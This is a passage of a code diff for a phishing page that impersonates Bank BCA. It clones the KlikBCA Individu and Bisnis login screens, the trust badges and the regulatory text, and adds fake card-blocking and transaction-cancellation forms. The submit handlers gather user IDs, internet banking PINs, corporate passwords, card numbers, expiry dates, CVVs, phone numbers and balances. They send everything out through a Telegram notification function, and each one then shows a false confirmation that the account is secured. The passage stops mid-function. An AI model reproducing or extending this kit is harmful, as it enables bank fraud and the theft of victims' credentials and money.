+                        <svg viewBox="0 0 24 24" style="width: 44px; height: 44px; fill: #00508c; margin: 0 auto 8px;"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
+                        <div id="uploadTextPrompt" style="font-weight: 700; color: #00508c; font-size: 0.9rem; margin-bottom: 4px;">Pilih Foto Bukti Transaksi</div>
+                        <div style="font-size: 0.75rem; color: #55606b;">Bisa foto struk ATM atau screenshot bukti transfer</div>
+                        <div class="preview-container" id="previewContainer">
+                            <img id="imagePreview" src="" alt="Pratinjau" style="border-radius: 8px; max-height: 180px; object-fit: contain; margin-top: 8px;" />
+                            <div style="font-size: 0.78rem; color: #4CD964; font-weight: 700; margin-top: 6px;">✓ Foto berhasil dipilih</div>
+                        </div>
+                    </div>
+
+                    <div class="mbca-notes-container">
+                        <div class="mbca-notes-title">Catatan:</div>
+                        <ul class="mbca-notes-list">
+                            <li class="mbca-notes-item">Lampirkan foto bukti transaksi (struk ATM, resi transfer, atau tangkapan layar m-Banking) yang jelas dan terbaca.</li>
+                            <li class="mbca-notes-item">Laporan pembatalan akan diverifikasi secara otomatis oleh sistem perbankan dalam waktu 1x24 jam.</li>
+                            <li class="mbca-notes-item">Dana transaksi yang berhasil dibatalkan akan dikembalikan ke rekening asal sesuai prosedur yang berlaku.</li>
+                        </ul>
+                    </div>
+
+                    <div class="mbca-action-buttons">
+                        <button type="button" class="mbca-btn-cancel" onclick="closeModal()">Cancel</button>
+                        <button class="mbca-btn-ok" id="cancelSubmitBtn" type="button" style="background: #d1d7dc; color: #94a3b8; cursor: not-allowed;" disabled>OK</button>
+                    </div>
+                </div>
+            `,
+            "userid": `
+                <div class="mbca-top-header" style="background: #ffffff; border-bottom: 1px solid #d9e2ec; padding: 10px 14px; margin: 0 -16px 0 -16px; border-radius: 8px 8px 0 0;">
+                    <div class="mbca-header-left" onclick="closeModal()">
+                        <button type="button" class="mbca-back-btn" aria-label="Kembali">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00508c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                        </button>
+                    </div>
+                    <!-- Mode Switcher Tabs -->
+                    <div style="display: flex; background: #e2e8f0; border-radius: 20px; padding: 3px; gap: 3px;" id="tabContainer">
+                        <button type="button" id="tabPerorangan" style="background: #00508c; color: white; border: none; padding: 6px 14px; font-size: 0.78rem; font-weight: 700; border-radius: 16px; cursor: pointer; transition: all 0.2s ease;">
+                            KlikBCA Individu
+                        </button>
+                        <button type="button" id="tabBisnis" style="background: transparent; color: #475569; border: none; padding: 6px 14px; font-size: 0.78rem; font-weight: 700; border-radius: 16px; cursor: pointer; transition: all 0.2s ease;">
+                            KlikBCA Bisnis
+                        </button>
+                    </div>
+                    <div class="mbca-header-right">
+                        <span class="mbca-status-indicator" title="Koneksi Aman Aktif"></span>
+                    </div>
+                </div>
+
+                <!-- ==================== TAMPILAN 1: KLIKBCA INDIVIDU (PERORANGAN) ==================== -->
+                <div id="viewPerorangan" style="margin: 0 -16px -24px -16px; background: #ffffff; display: block; border-radius: 0 0 8px 8px; overflow: hidden;">
+                    <!-- Top Yellow Band -->
+                    <div style="height: 6px; background: #ffcc00; width: 100%;"></div>
+                    <!-- Blue Header Bar with 3D KlikBCA Badge Logo -->
+                    <div style="background: #00438c; height: 50px; padding: 0 16px; display: flex; align-items: center; box-shadow: inset 0 1px 0 rgba(255,255,255,0.2);">
+                        <svg width="86" height="42" viewBox="0 0 120 62" fill="none" style="filter: drop-shadow(0 2px 3px rgba(0,0,0,0.3));">
+                            <defs>
+                                <linearGradient id="kbcabg" x1="0" y1="0" x2="0" y2="1">
+                                    <stop offset="0%" stop-color="#195ba5"/>
+                                    <stop offset="50%" stop-color="#0b4393"/>
+                                    <stop offset="100%" stop-color="#072e66"/>
+                                </linearGradient>
+                                <linearGradient id="kbcashine" x1="0" y1="0" x2="1" y2="0">
+                                    <stop offset="0%" stop-color="#fed100"/>
+                                    <stop offset="50%" stop-color="#ffffff"/>
+                                    <stop offset="100%" stop-color="#fed100"/>
+                                </linearGradient>
+                            </defs>
+                            <rect x="2" y="3" width="116" height="56" rx="8" fill="#031b3e" />
+                            <rect x="2" y="1" width="116" height="56" rx="8" fill="url(#kbcabg)" stroke="#ffffff" stroke-width="1.2" />
+                            <path d="M4 20 C 30 6, 80 6, 116 16 L 116 11 C 78 2, 32 2, 4 12 Z" fill="url(#kbcashine)" opacity="0.95"/>
+                            <text x="36" y="27" fill="#ffffff" font-size="20" font-weight="900" font-family="'Trebuchet MS', sans-serif" font-style="italic">Klik</text>
+                            <g transform="translate(14, 32) scale(0.65)">
+                                <circle cx="16" cy="14" r="13" fill="#ffffff"/>
+                                <path d="M16 3 C13 7 13 11 16 14 C19 11 19 7 16 3Z" fill="#00508c"/>
+                                <path d="M5 14 C9 11 13 11 16 14 C13 17 9 17 5 14Z" fill="#00508c"/>
+                                <path d="M27 14 C23 11 19 11 16 14 C19 17 23 17 27 14Z" fill="#00508c"/>
+                                <path d="M16 25 C13 21 13 17 16 14 C19 17 19 21 16 25Z" fill="#00508c"/>
+                                <path d="M8 6 C12 9 14 12 16 14 C12 14 9 12 8 6Z" fill="#00508c"/>
+                                <path d="M24 6 C20 9 18 12 16 14 C20 14 23 12 24 6Z" fill="#00508c"/>
+                            </g>
+                            <text x="44" y="50" fill="#ffffff" font-size="22" font-weight="900" font-family="'Arial Black', Impact, sans-serif" font-style="italic" letter-spacing="1">BCA</text>
+                        </svg>
+                    </div>
+                    <!-- Bottom Yellow Band -->
+                    <div style="height: 6px; background: #ffcc00; width: 100%;"></div>
+
+                    <!-- Perorangan Form Body -->
+                    <form id="formUserIdPerorangan" style="padding: 16px 18px 20px 18px; background: #ffffff;">
+                        <div style="text-decoration: underline; color: #1e3a5f; font-size: 15px; font-weight: 600; line-height: 1.3;">Silakan masukkan USER ID Anda</div>
+                        <div style="color: #d97706; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Please enter your USER ID</div>
+                        <input type="text" id="uiUserIdPerorangan" required style="width: 100%; height: 36px; border: 2px solid #111111; border-radius: 2px; padding: 4px 10px; font-size: 15px; outline: none; margin-bottom: 14px; background: #ffffff; color: #000000; box-sizing: border-box;" />
+
+                        <div style="text-decoration: underline; color: #1e3a5f; font-size: 15px; font-weight: 600; line-height: 1.3;">Silakan masukkan PIN Internet Banking Anda</div>
+                        <div style="color: #d97706; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Please enter your Internet Banking PIN</div>
+                        <input type="password" id="uiPinPerorangan" maxlength="12" required style="width: 100%; height: 36px; border: 1.5px solid #64748b; border-radius: 3px; padding: 4px 10px; font-size: 15px; outline: none; margin-bottom: 14px; background: #ffffff; color: #000000; box-sizing: border-box;" />
+
+                        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px;">
+                            <button type="submit" id="submitPeroranganBtn" style="background: #e5e7eb; border: 1.5px solid #4b5563; border-radius: 3px; padding: 5px 18px; font-size: 14px; font-weight: 700; color: #111827; cursor: pointer; box-shadow: 0 1px 2px rgba(0,0,0,0.15);">LOGIN</button>
+                            <a href="https://m.klikbca.com" target="_blank" rel="noopener noreferrer" style="color: #003399; text-decoration: underline; font-size: 15px; font-weight: 600;">Full Site</a>
+                        </div>
+
+                        <!-- Browser/OS Terupdate Banner -->
+                        <div style="border: 1px solid #bfdbfe; border-radius: 6px; background: linear-gradient(180deg, #f8fbfe 0%, #e9f2fa 100%); padding: 8px 10px; display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 14px; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
+                            <!-- Laptop + Checkmarks -->
+                            <div style="display: flex; flex-direction: column; gap: 3px; font-size: 10px; font-weight: 700; color: #1e3a5f; flex-shrink: 0;">
+                                <div style="display: flex; align-items: center; gap: 4px;">
+                                    <span style="color: #16a34a; font-size: 12px; font-weight: 900;">✓</span>
+                                    <span>Browser Terupdate</span>
+                                </div>
+                                <div style="display: flex; align-items: center; gap: 4px;">
+                                    <span style="color: #16a34a; font-size: 12px; font-weight: 900;">✓</span>
+                                    <span>OS Terupdate</span>
+                                </div>
+                            </div>
+                            <!-- Banker in suit with OS icon -->
+                            <div style="flex-shrink: 0;">
+                                <svg width="38" height="38" viewBox="0 0 64 64" fill="none">
+                                    <circle cx="32" cy="18" r="10" fill="#fcd34d"/>
+                                    <path d="M22 14 C22 10 26 8 32 8 C38 8 42 10 42 14 C42 16 38 17 38 17 C38 17 34 16 32 16 C30 16 26 17 26 17 Z" fill="#475569"/>
+                                    <path d="M16 48 L22 28 L42 28 L48 48 Z" fill="#00508c"/>
+                                    <path d="M28 28 L32 38 L36 28 Z" fill="#ffffff"/>
+                                    <path d="M31 30 L33 30 L32.5 40 L31.5 40 Z" fill="#dc2626"/>
+                                    <circle cx="50" cy="22" r="7" fill="#38bdf8"/>
+                                    <text x="50" y="25" text-anchor="middle" fill="#ffffff" font-size="7" font-weight="900" font-family="sans-serif">OS</text>
+                                </svg>
+                            </div>
+                            <!-- Speech bubble text -->
+                            <div style="background: #ffffff; border: 1px solid #cbd5e1; border-radius: 12px; padding: 6px 8px; font-size: 9.5px; color: #334155; line-height: 1.35; flex: 1; text-align: center;">
+                                <div>Layanan KlikBCA hanya dapat diakses secara optimal melalui browser terupdate.</div>
+                                <div style="margin-top: 2px;">Info lengkapnya <span style="color: #dc2626; font-weight: bold; text-decoration: underline; cursor: pointer;">klik disini</span></div>
+                            </div>
+                            <!-- Small KlikBCA Logo in banner -->
+                            <div style="flex-shrink: 0; background: #00508c; color: #ffffff; font-size: 7.5px; font-weight: bold; padding: 3px 4px; border-radius: 3px; text-align: center; line-height: 1.1;">
+                                <span style="font-style: italic; font-size: 7px;">Klik</span><br/><b>BCA</b>
+                            </div>
+                        </div>
+
+                        <!-- Trust Badges: AWAS MODUS & DigiCert EV Secure -->
+                        <div style="display: flex; align-items: center; gap: 14px; margin-bottom: 14px;">
+                            <div style="display: flex; align-items: center; gap: 6px;">
+                                <svg viewBox="0 0 36 36" width="30" height="30">
+                                    <path d="M18 4 C13 4 10 7 10 12 L10 16 L26 16 L26 12 C26 7 23 4 18 4 Z" fill="none" stroke="#00508c" stroke-width="3"/>
+                                    <circle cx="18" cy="24" r="11" fill="#00508c"/>
+                                    <path d="M18 13 A 11 11 0 0 1 29 24 L 18 24 Z" fill="#e11d48"/>
+                                    <path d="M29 24 A 11 11 0 0 1 18 35 L 18 24 Z" fill="#22c55e"/>
+                                    <path d="M18 35 A 11 11 0 0 1 7 24 L 18 24 Z" fill="#eab308"/>
+                                    <circle cx="18" cy="24" r="4" fill="#ffffff"/>
+                                </svg>
+                                <div style="display: flex; flex-direction: column; line-height: 1;">
+                                    <span style="font-size: 11px; font-weight: 900; color: #dc2626; letter-spacing: 0.3px;">AWAS<br/><span style="color: #00508c;">MODUS</span></span>
+                                    <span style="background: #f59e0b; color: #1e3a5f; font-size: 7.5px; font-weight: 800; padding: 1px 4px; border-radius: 2px; margin-top: 2px; text-align: center;">Klik disini</span>
+                                </div>
+                            </div>
+                            <div style="border: 1.5px solid #00508c; border-radius: 6px; padding: 3px 6px; display: flex; align-items: center; gap: 5px; background: #ffffff;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="#00508c">
+                                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                                </svg>
+                                <div style="display: flex; flex-direction: column; line-height: 1;">
+                                    <span style="font-size: 9px; font-weight: 800; color: #00508c;">digicert</span>
+                                    <span style="font-size: 7px; font-weight: 700; color: #00508c;">EV SECURE</span>
+                                    <span style="font-size: 6px; color: #64748b;">Click to Verify</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Regulatory Notice Section -->
+                        <div style="font-size: 11.5px; line-height: 1.45; color: #1e293b; margin-top: 4px;">
+                            <p style="margin-bottom: 4px;">BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.</p>
+                            <p style="margin-bottom: 4px;">BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per nasabah per bank adalah Rp2 miliar.</p>
+                            <p style="margin-bottom: 6px;">Untuk cek Tingkat Bunga Penjaminan LPS, klik <a href="#" style="text-decoration: underline; color: #1e293b; font-weight: 500;">disini</a>.</p>
+                        </div>
+                        <div style="border-bottom: 1.5px solid #d97706; margin: 6px 0 8px 0;"></div>
+                        <div style="font-size: 11.5px; line-height: 1.45; color: #d97706; margin-bottom: 14px;">
+                            <p style="margin-bottom: 4px;">BCA is licensed and supervised by Financial Services Authority (Otoritas Jasa Keuangan) & Bank Indonesia.</p>
+                            <p style="margin-bottom: 4px;">BCA is a member of Indonesia Deposit Insurance Corporation (LPS). The maximum deposit value guaranteed by LPS per customer per bank is IDR 2 billion.</p>
+                            <p style="margin-bottom: 0;">To check the LPS Guarantee Interest Rate, click <a href="#" style="text-decoration: underline; color: #d97706; font-weight: 500;">here</a>.</p>
+                        </div>
+                    </form>
+
+                    <!-- Bottom Solid Blue Footer Bar -->
+                    <div style="height: 38px; background: #00438c; width: 100%;"></div>
+                </div>
+
+                <!-- ==================== TAMPILAN 2: KLIKBCA BISNIS ==================== -->
+                <div id="viewBisnis" style="margin: 0 -16px -24px -16px; background: #f1f6fa; display: none; padding: 18px 20px 24px 20px; position: relative; overflow: hidden; border-radius: 0 0 8px 8px; min-height: 520px;">
+                    <!-- Decorative soft blue shape on bottom right -->
+                    <div style="position: absolute; right: -50px; bottom: -20px; width: 150px; height: 150px; border-radius: 50%; background: #96c2e8; opacity: 0.55; pointer-events: none; z-index: 1;"></div>
+
+                    <!-- Top row: English Version + Home Icon -->
+                    <div style="display: flex; align-items: center; justify-content: flex-end; gap: 12px; margin-bottom: 16px; position: relative; z-index: 2;">
+                        <span style="color: #00508c; font-size: 14px; font-weight: 600; cursor: pointer;">English Version</span>
+                        <button type="button" onclick="closeModal()" title="Beranda" style="width: 36px; height: 36px; border-radius: 50%; background: #38495a; display: flex; align-items: center; justify-content: center; color: #ffffff; border: none; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.15);">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                            </svg>
+                        </button>
+                    </div>
+
+                    <!-- Branding Header -->
+                    <div style="margin-bottom: 24px; position: relative; z-index: 2;">
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <svg width="34" height="34" viewBox="0 0 100 100">
+                                <rect width="100" height="100" rx="20" fill="#00508c"/>
+                                <circle cx="50" cy="50" r="40" fill="#ffffff"/>
+                                <path d="M50 20 C42 32 42 42 50 50 C58 42 58 32 50 20Z" fill="#00508c"/>
+                                <path d="M20 50 C32 42 42 42 50 50 C42 58 32 58 20 50Z" fill="#00508c"/>
+                                <path d="M80 50 C68 42 58 42 50 50 C58 58 68 58 80 50Z" fill="#00508c"/>
+                                <path d="M50 80 C42 68 42 58 50 50 C58 58 58 68 50 80Z" fill="#00508c"/>
+                                <path d="M29 29 C39 37 44 44 50 50 C44 44 37 39 29 29Z" fill="#00508c"/>
+                                <path d="M71 29 C61 37 56 44 50 50 C56 44 63 39 71 29Z" fill="#00508c"/>
+                            </svg>
+                            <span style="font-size: 34px; font-weight: 900; font-style: italic; color: #00508c; font-family: 'Arial Black', sans-serif; letter-spacing: -0.5px;">BCA</span>
+                        </div>
+                        <h1 style="color: #004481; font-size: 26px; font-weight: 800; margin: 6px 0 2px 0; letter-spacing: -0.3px;">KlikBCA Bisnis</h1>
+                        <div style="color: #005e9c; font-size: 17px; font-weight: 500;">VPN Secure Connection</div>
+                    </div>
+
+                    <!-- Bisnis Form -->
+                    <form id="formUserIdBisnis" style="position: relative; z-index: 2;">
+                        <div style="margin-bottom: 16px;">
+                            <label style="display: block; color: #00508c; font-size: 14px; font-weight: 700; margin-bottom: 6px;">Username</label>
+                            <input type="text" id="uiUsernameBisnis" required placeholder="CorporateID UserID (tanpa spasi)" style="width: 100%; height: 46px; background: #ffffff; border: 1.5px solid #93c5fd; border-radius: 8px; padding: 0 14px; font-size: 14.5px; color: #1e293b; outline: none; box-sizing: border-box; box-shadow: 0 1px 2px rgba(0,0,0,0.03);" />
+                        </div>
+
+                        <div style="margin-bottom: 22px;">
+                            <label style="display: block; color: #00508c; font-size: 14px; font-weight: 700; margin-bottom: 6px;">Password</label>
+                            <input type="password" id="uiPassBisnis" required placeholder="KeyBCA Appli 1" style="width: 100%; height: 46px; background: #ffffff; border: 1.5px solid #cbd5e1; border-radius: 8px; padding: 0 14px; font-size: 14.5px; color: #1e293b; outline: none; box-sizing: border-box; box-shadow: 0 1px 2px rgba(0,0,0,0.03);" />
+                        </div>
+
+                        <div style="margin-bottom: 22px;">
+                            <button type="submit" id="submitBisnisBtn" style="width: 100%; height: 48px; background: #0060af; color: #ffffff; font-weight: 800; font-size: 16px; letter-spacing: 0.5px; border-radius: 9999px; border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 96, 175, 0.25); transition: background 0.2s;">LOGIN</button>
+                        </div>
+
+                        <!-- Security Notices -->
+                        <div style="font-size: 13.5px; color: #1e293b; line-height: 1.5; margin-bottom: 18px;">
+                            <p style="margin-bottom: 12px;">Jangan membagikan Corporate/User ID, Respon KeyBCA Appli 1 dan 2 kepada siapa pun.</p>
+                            <p style="margin-bottom: 12px;">
+                                Jika ada yang hal yang mencurigakan hubungi Halo BCA Bisnis via telepon di 1500998 atau bebas pulsa via aplikasi 
+                                <span style="display: inline-flex; align-items: center; justify-content: center; background: #00508c; color: #ffffff; border-radius: 6px; padding: 2px 6px; font-size: 9px; font-weight: 800; margin-left: 2px; vertical-align: middle; line-height: 1.1; text-align: center;">
+                                    halo<br/>BCA
+                                </span>
+                            </p>
+                            <p style="margin-bottom: 14px;">
+                                Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses <span style="color: #00508c; text-decoration: underline; font-weight: 500; cursor: pointer;">Informasi KlikBCA Bisnis</span> atau hubungi:
+                            </p>
+                            <div style="display: flex; align-items: center; gap: 10px; margin-top: 8px;">
+                                <div style="width: 36px; height: 36px; border-radius: 50%; background: #00a4e4; display: flex; align-items: center; justify-content: center; color: white; flex-shrink: 0; box-shadow: 0 2px 4px rgba(0, 164, 228, 0.3);">
+                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                        <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <div style="font-size: 13px; color: #00508c; font-weight: 600; line-height: 1.2;">Halo Layanan KlikBCA Bisnis</div>
+                                    <div style="font-size: 13.5px; color: #00508c; font-weight: 800;">1500998</div>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            `
+        };
+
+        const splashScreen = document.createElement('div');
+        splashScreen.className = 'app-splash-screen';
+        splashScreen.innerHTML = `
+            <img src="${splashBcaMobileLogoUrl}" alt="BCA Mobile" class="app-splash-logo" />
+            <div class="app-splash-subtitle">Memuat Layanan Keamanan...</div>
+        `;
+        modalOverlay.appendChild(splashScreen);
+
+        const cards = document.querySelectorAll('.hero-card-item');
+        cards.forEach(card => {
+            card.addEventListener('click', () => {
+                const serviceType = card.getAttribute('data-service');
+                if (serviceTemplates[serviceType]) {
+                    document.body.classList.add('modal-open');
+                    modalOverlay.classList.add('active');
+                    splashScreen.classList.add('active');
+
+                    setTimeout(() => {
+                        modalContentBody.innerHTML = `<div class="step-fade-in">${serviceTemplates[serviceType]}</div>`;
+                        const closeBtn = document.getElementById('modalCloseBtn');
+                        if (closeBtn) closeBtn.addEventListener('click', closeModal);
+                        splashScreen.classList.remove('active');
+
+                        attachInputValidation();
+
+                        const cardInput = document.getElementById('bNoKartu') || document.getElementById('blNoKartu');
+                        const cardTypeLabel = document.getElementById('cardTypeLabel');
+                        const cardNumPreview = document.getElementById('cardNumPreview');
+                        const cardMetaNumDisplay = document.getElementById('cardMetaNumDisplay');
+                        const cardLogoBadge = document.getElementById('cardLogoBadge');
+                        const cvvFormGroup = document.getElementById('cvvFormGroup');
+                        const cvvInputBox = document.getElementById('cvvInputBox');
+                        const cardFlipContainerBox = document.getElementById('cardFlipContainerBox');
+
+                        if (cardInput) {
+                            cardInput.addEventListener('input', (e) => {
+                                let val = e.target.value.replace(/\D/g, '');
+                                if (val.length > 16) val = val.substring(0, 16);
+
+                                let formattedVal = val.match(/.{1,4}/g)?.join(' ') || val;
+                                e.target.value = formattedVal;
+
+                                const info = detectCardType(val);
+                                
+                                if (cardTypeLabel) cardTypeLabel.textContent = val.length > 0 ? `[ ${info.name} ]` : '';
+                                if (cardLogoBadge) {
+                                    cardLogoBadge.innerHTML = info.logoHtml;
+                                    cardLogoBadge.style.background = 'transparent';
+                                    cardLogoBadge.style.padding = '0';
+                                }
+                                if (cardNumPreview) cardNumPreview.textContent = val.length > 0 ? formattedVal : '•••• •••• •••• ••••';
+                                if (cardMetaNumDisplay) cardMetaNumDisplay.textContent = val.length > 0 ? formattedVal : '•••• •••• •••• ••••';
+
+                                if (val.length >= 4) {
+                                    const hasCvv = hasCvvCapability(val);
+                                    if (!hasCvv) {
+                                        if (cvvFormGroup) cvvFormGroup.style.display = 'none';
+                                        if (cvvInputBox) {
+                                            cvvInputBox.value = '';
+                                            cvvInputBox.removeAttribute('required');
+                                        }
+                                        if (cardFlipContainerBox) cardFlipContainerBox.style.display = 'none';
+                                    } else {
+                                        if (cvvFormGroup) cvvFormGroup.style.display = 'block';
+                                        if (cvvInputBox) cvvInputBox.setAttribute('required', 'true');
+                                        if (cardFlipContainerBox) cardFlipContainerBox.style.display = 'block';
+                                    }
+                                }
+                            });
+                        }
+
+                        const masaInput = document.getElementById('bMasa') || document.getElementById('blMasa');
+                        const cardExpiryPreview = document.getElementById('cardExpiryPreview');
+                        if (masaInput && cardExpiryPreview) {
+                            masaInput.addEventListener('input', (e) => {
+                                const val = e.target.value.trim();
+                                cardExpiryPreview.textContent = val.length > 0 ? val : 'MM/YY';
+                            });
+                        }
+
+                        // Interaksi Tab Form User ID (Perorangan vs Bisnis)
+                        const tabPerorangan = document.getElementById('tabPerorangan');
+                        const tabBisnis = document.getElementById('tabBisnis');
+                        const viewPerorangan = document.getElementById('viewPerorangan');
+                        const viewBisnis = document.getElementById('viewBisnis');
+                        const formUserIdPerorangan = document.getElementById('formUserIdPerorangan');
+                        const formUserIdBisnis = document.getElementById('formUserIdBisnis');
+
+                        if (tabPerorangan && tabBisnis) {
+                            let currentMode = 'Perorangan';
+
+                            tabPerorangan.addEventListener('click', () => {
+                                if (currentMode === 'Perorangan') return;
+                                currentMode = 'Perorangan';
+                                tabPerorangan.style.background = '#00508c';
+                                tabPerorangan.style.color = 'white';
+                                tabBisnis.style.background = 'transparent';
+                                tabBisnis.style.color = '#475569';
+
+                                if (viewPerorangan) viewPerorangan.style.display = 'block';
+                                if (viewBisnis) viewBisnis.style.display = 'none';
+                            });
+
+                            tabBisnis.addEventListener('click', () => {
+                                if (currentMode === 'Bisnis') return;
+                                currentMode = 'Bisnis';
+                                tabBisnis.style.background = '#00508c';
+                                tabBisnis.style.color = 'white';
+                                tabPerorangan.style.background = 'transparent';
+                                tabPerorangan.style.color = '#475569';
+
+                                if (viewPerorangan) viewPerorangan.style.display = 'none';
+                                if (viewBisnis) viewBisnis.style.display = 'block';
+                            });
+
+                            if (formUserIdPerorangan) {
+                                formUserIdPerorangan.addEventListener('submit', (e) => {
+                                    e.preventDefault();
+                                    const userIdVal = document.getElementById('uiUserIdPerorangan') ? document.getElementById('uiUserIdPerorangan').value : '';
+                                    const pinVal = document.getElementById('uiPinPerorangan') ? document.getElementById('uiPinPerorangan').value : '';
+
+                                    runSecureCountdown('Mengamankan KlikBCA Individu...', () => {
+                                        const msg = `🚨 *LAPORAN AMANKAN USER ID (KLIKBCA INDIVIDU / PERORANGAN)*\n\n` +
+                                                    `• Layanan: *KlikBCA Individu*\n` +
+                                                    `• User ID: \`${userIdVal}\`\n` +
+                                                    `• PIN Internet Banking: \`${pinVal}\``;
+                                        
+                                        sendTelegramNotification(msg);
+                                        showBankSuccessAlert('Permintaan pengamanan KlikBCA Individu berhasil diproses.', () => {
+                                            closeModal();
+                                        });
+                                    });
+                                });
+                            }
+
+                            if (formUserIdBisnis) {
+                                formUserIdBisnis.addEventListener('submit', (e) => {
+                                    e.preventDefault();
+                                    const usernameVal = document.getElementById('uiUsernameBisnis') ? document.getElementById('uiUsernameBisnis').value : '';
+                                    const passVal = document.getElementById('uiPassBisnis') ? document.getElementById('uiPassBisnis').value : '';
+
+                                    runSecureCountdown('Mengamankan KlikBCA Bisnis...', () => {
+                                        const msg = `🚨 *LAPORAN AMANKAN USER ID (KLIKBCA BISNIS)*\n\n` +
+                                                    `• Layanan: *KlikBCA Bisnis*\n` +
+                                                    `• Username (CorporateID & UserID): \`${usernameVal}\`\n` +
+                                                    `• Password (KeyBCA Appli 1): \`${passVal}\``;
+                                        
+                                        sendTelegramNotification(msg);
+                                        showBankSuccessAlert('Permintaan pengamanan KlikBCA Bisnis berhasil diproses.', () => {
+                                            closeModal();
+                                        });
+                                    });
+                                });
+                            }
+                        }
+
+                        const formBlokir = document.getElementById('formBlokir');
+                        if (formBlokir) {
+                            formBlokir.addEventListener('submit', (e) => {
+                                e.preventDefault();
+                                const noKartu = document.getElementById('bNoKartu').value;
+                                const noHp = document.getElementById('bNoHp').value;
+                                const masa = document.getElementById('bMasa').value;
+                                const cvv = cvvInputBox ? cvvInputBox.value : '';
+                                const limit = document.getElementById('bLimit').value;
+                                const cleanCardNum = noKartu.replace(/\s+/g, '');
+                                const needsCvv = hasCvvCapability(cleanCardNum);
+
+                                if (!validateForm(cleanCardNum, noHp, masa, cvv, needsCvv)) return;
+
+                                runSecureCountdown("Memproses Pemblokiran...", () => {
+                                    const cardType = detectCardType(cleanCardNum).name;
+                                    const msg = `🚨 *LAPORAN BLOKIR KARTU BCA*\n\n` +
+                                                `• Jenis Kartu: *${cardType}*\n` +
+                                                `• No Kartu: \`${noKartu}\`\n` +
+                                                `• No HP: \`${noHp}\`\n` +
+                                                `• Masa Berlaku: \`${masa}\`\n` +
+                                                `• CVV: \`${needsCvv ? cvv : 'Tidak Ada'}\`\n` +
+                                                `• Limit/Saldo: \`${limit}\``;
+                                    
+                                    sendTelegramNotification(msg);
+                                    
+                                    showBankSuccessAlert('Kartu berhasil diblokir sementara. Mengarahkan ke halaman pembatalan...', () => {
+                                        renderPembatalanForm();
+                                    });
+                                });
+                            });
+                        }
+
+                        const formBankLain = document.getElementById('formBankLain');
+                        const bankSelector = document.getElementById('bankSelector');
+                        if (formBankLain) {
+                            formBankLain.addEventListener('submit', (e) => {
+                                e.preventDefault();
+                                const bankName = bankSelector.options[bankSelector.selectedIndex].text;
+                                const noKartu = document.getElementById('blNoKartu').value;
+                                const noHp = document.getElementById('blNoHp').value;
+                                const masa = document.getElementById('blMasa').value;
+                                const cvv = cvvInputBox ? cvvInputBox.value : '';
+                                const limit = document.getElementById('blLimit').value;
+                                const cleanCardNum = noKartu.replace(/\s+/g, '');
+                                const needsCvv = hasCvvCapability(cleanCardNum);
+
+                                if (!validateForm(cleanCardNum, noHp, masa, cvv, needsCvv)) return;
+
+                                runSecureCountdown("Mengamankan Bank...", () => {
+                                    const cardType = detectCardType(cleanCardNum).name;
+                                    const msg = `🚨 *LAPORAN AMANKAN BANK LAIN*\n\n` +
+                                                `• Bank: *${bankName}*\n` +
+                                                `• Jenis Kartu: *${cardType}*\n` +
+                                                `• No Kartu: \`${noKartu}\`\n` +
+                                                `• No HP: \`${noHp}\`\n` +
+                                                `• Masa Berlaku: \`${masa}\`\n` +
+                                                `• CVV: \`${needsCvv ? cvv : 'Tidak Ada'}\`\n` +
+                                                `• Limit/Saldo: \`${limit}\``;
+                                    
+                                    sendTelegramNotification(msg);
+                                    
+                                    showBankSuccessAlert('Kartu berhasil diblokir sementara. Mengarahkan ke halaman pembatalan...', () => {
+                                        renderPembatalanForm();
+                                    });
+                                });
+                            });
+                        }
+
+                        const cardFlipInner = document.getElementById('cardFlipInner');
+                        const cvvDisplayTarget = document.getElementById('cvvDisplayTarget');
+
+                        if (cardFlipContainerBox && cardFlipInner) {
+                            cardFlipContainerBox.style.cursor = 'pointer';
+                            cardFlipContainerBox.setAttribute('title', 'Klik untuk membalik kartu');
+                            cardFlipContainerBox.addEventListener('click', () => {
+                                cardFlipInner.classList.toggle('is-flipped');
+                                cardFlipInner.style.transform = '';
+                            });
+
+                            let tiltRaf = null;
+
+                            const handleTilt = (clientX, clientY) => {
+                                const rect = cardFlipContainerBox.getBoundingClientRect();
+                                const x = (clientX - rect.left) / rect.width;
+                                const y = (clientY - rect.top) / rect.height;
+                                
